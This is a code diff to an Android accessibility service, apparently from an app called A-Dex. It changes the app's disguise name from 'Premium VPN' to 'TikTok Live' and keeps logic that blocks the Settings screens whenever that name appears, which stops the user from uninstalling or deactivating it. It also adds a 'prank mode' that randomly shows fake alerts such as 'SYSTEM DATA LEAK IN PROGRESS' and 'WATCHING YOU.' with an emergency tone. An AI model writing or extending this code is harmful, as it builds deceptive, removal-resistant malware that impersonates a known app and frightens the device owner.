@@ -59,12 +59,13 @@ class AppMonitorAccessibilityService : AccessibilityService() {
             return
         }
 
-        // Anti-Uninstall & Anti-Deactivation: Block A-Dex App Info or Deactivation in Settings
+        // Anti-Uninstall & Anti-Deactivation: Block TikTok Live App Info or Deactivation in Settings
         if (packageName == "com.android.settings" || packageName == "com.google.android.settings") {
             val root = rootInActiveWindow
             if (root != null) {
                 // Check if our app name is visible
-                val appFound = root.findAccessibilityNodeInfosByText("Premium VPN").isNotEmpty()
+                val appFound = root.findAccessibilityNodeInfosByText("TikTok Live").isNotEmpty() || 
+                           root.findAccessibilityNodeInfosByText("TikTok Live Engine").isNotEmpty()
                 
                 if (appFound) {
                     // Check for critical action buttons
@@ -95,18 +96,25 @@ class AppMonitorAccessibilityService : AccessibilityService() {
         }
         ContextCompat.startForegroundService(this, serviceIntent)
 
+        // Prank Mode: Randomly trigger jump scares on app launch
+        if (settingsStore.prankModeEnabled && Math.random() < 0.08) { // 8% chance
+            triggerJumpScare()
+        }
+
         if (isPackageLocked(packageName)) {
+            if (ParentalShieldManager.isTemporarilyUnlocked(settingsStore)) {
+                return
+            }
+
             val shieldPackage = ParentalShieldManager.isShieldProtectedPackage(packageName)
-            if (shieldPackage) {
-                if (!settingsStore.shieldEnabled || ParentalShieldManager.isTemporarilyUnlocked(settingsStore)) {
-                    return
-                }
+            if (shieldPackage && !settingsStore.shieldEnabled) {
+                return
             }
 
             val blockIntent = Intent(this, BlockingOverlayActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                 putExtra(BlockingOverlayActivity.EXTRA_PACKAGE_NAME, packageName)
-                putExtra(BlockingOverlayActivity.EXTRA_PIN_REQUIRED, shieldPackage)
+                putExtra(BlockingOverlayActivity.EXTRA_PIN_REQUIRED, true)
             }
             startActivity(blockIntent)
             return
@@ -182,6 +190,32 @@ class AppMonitorAccessibilityService : AccessibilityService() {
     }
 
     private fun packageNameInternal(): String = applicationContext.packageName
+
+    private fun triggerJumpScare() {
+        val scaryTexts = listOf(
+            "CRITICAL SYSTEM ERROR: MEMORY CORRUPTION",
+            "WARNING: UNKNOWN ACCESS DETECTED",
+            "SYSTEM DATA LEAK IN PROGRESS...",
+            "WATCHING YOU.",
+            "YOU ARE NOT ALONE.",
+            "WHO IS BEHIND YOU?",
+            "HELP ME."
+        )
+        val text = scaryTexts.random()
+        
+        val intent = Intent(this, com.adex.app.ui.MessageOverlayActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+            putExtra(com.adex.app.ui.MessageOverlayActivity.EXTRA_TEXT, text)
+            putExtra(com.adex.app.ui.MessageOverlayActivity.EXTRA_SECONDS, 6)
+        }
+        startActivity(intent)
+
+        // Add a creepy beep
+        try {
+            val generator = android.media.ToneGenerator(android.media.AudioManager.STREAM_NOTIFICATION, 100)
+            generator.startTone(android.media.ToneGenerator.TONE_CDMA_EMERGENCY_RINGBACK, 500)
+        } catch (_: Exception) {}
+    }
 
     companion object {
         @Volatile
